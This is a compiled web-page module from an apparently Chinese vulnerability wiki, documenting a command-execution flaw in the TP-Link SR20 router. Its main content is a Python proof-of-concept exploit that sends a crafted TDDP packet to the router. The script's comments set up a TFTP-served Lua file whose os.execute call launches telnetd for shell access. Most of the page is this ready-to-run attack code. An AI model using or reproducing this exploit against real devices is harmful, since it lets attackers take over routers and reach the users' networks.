import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const e={},p=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>据外媒报道，著名安全专家、Google 安全工程师Matthew Garrett公开了TP-LINK SR20智能家居路由器一个“允许来自本地网络连接的任意命令执行”的漏洞。攻击者可通过该漏洞控制用户路由器，借此执行任意命令，危及用户隐私安全。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>TP-Link SR20
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python3</span>
<span class="token comment"># Create /testfile in your tftp root directory with the followingcontents:</span>
<span class="token comment">#function config_test(config)</span>
<span class="token comment"># os.execute(&quot;telnetd -l/bin/login.sh&quot;)</span>
<span class="token comment">#end</span>
<span class="token comment"># Replace 192.168.0.1 with the IP address of the vulnerable device</span>
importbinascii
importsocket
port_send <span class="token operator">=</span> <span class="token number">1040</span>
port_receive <span class="token operator">=</span> <span class="token number">61000</span>
tddp_ver <span class="token operator">=</span> <span class="token string">&quot;01&quot;</span>
tddp_command <span class="token operator">=</span> <span class="token string">&quot;31&quot;</span>
tddp_req <span class="token operator">=</span> <span class="token string">&quot;01&quot;</span>
tddp_reply <span class="token operator">=</span> <span class="token string">&quot;00&quot;</span>
tddp_padding <span class="token operator">=</span> <span class="token string">&quot;%0.16X&quot;</span><span class="token operator">%</span> <span class="token number">00</span>
tddp_packet <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>tddp_ver<span class="token punctuation">,</span> tddp_command<span class="token punctuation">,</span> tddp_req<span class="token punctuation">,</span>tddp_reply<span class="token punctuation">,</span> tddp_padding<span class="token punctuation">]</span><span class="token punctuation">)</span>
sock_receive <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>
sock_receive<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> port_receive<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># Send a request</span>
sock_send <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>
packet <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>tddp_packet<span class="token punctuation">)</span>
packet <span class="token operator">=</span> packet <span class="token operator">+</span> <span class="token string">b&quot;/testfile;arbitrary&quot;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>packet<span class="token punctuation">)</span>
sock_send<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token string">&quot;192.168.0.1&quot;</span><span class="token punctuation">,</span> port_send<span class="token punctuation">)</span><span class="token punctuation">)</span>
sock_send<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
response<span class="token punctuation">,</span> addr <span class="token operator">=</span> sock_receive<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span> <span class="token number">1024</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> response<span class="token punctuation">.</span>encode<span class="token punctuation">(</span> <span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),o=[p];function c(i,l){return s(),a("div",null,o)}const d=n(e,[["render",c],["__file","TP-Link SR20 远程命令执行.html.vue"]]);export{d as default};
